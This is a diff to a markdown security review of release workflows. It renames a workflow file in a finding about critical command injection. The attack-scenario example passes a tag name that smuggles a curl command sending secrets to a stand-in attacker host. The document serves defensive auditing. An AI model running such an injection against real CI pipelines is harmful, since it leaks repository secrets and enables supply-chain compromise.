@@ -379,7 +379,7 @@ Looking at releases before August 2026:
 Code review of release workflows (including nightly.yml from PR #7790) identified **7 security vulnerabilities**:
 
 #### 1. Command Injection (CRITICAL)
-**Location:** `promote-prerelease.yml`  
+**Location:** `promote-nightly-to-prerelease.yml`  
 **Risk:** Malicious tag name could execute arbitrary commands
 
 ```yaml
@@ -391,7 +391,7 @@ run: |
 
 **Attack scenario:**
 ```bash
-gh workflow run promote-prerelease.yml \
+gh workflow run promote-nightly-to-prerelease.yml \
   -f prereleaseTag='v1.0.0; curl attacker.com/steal?secret=$SECRETS'
 ```
 
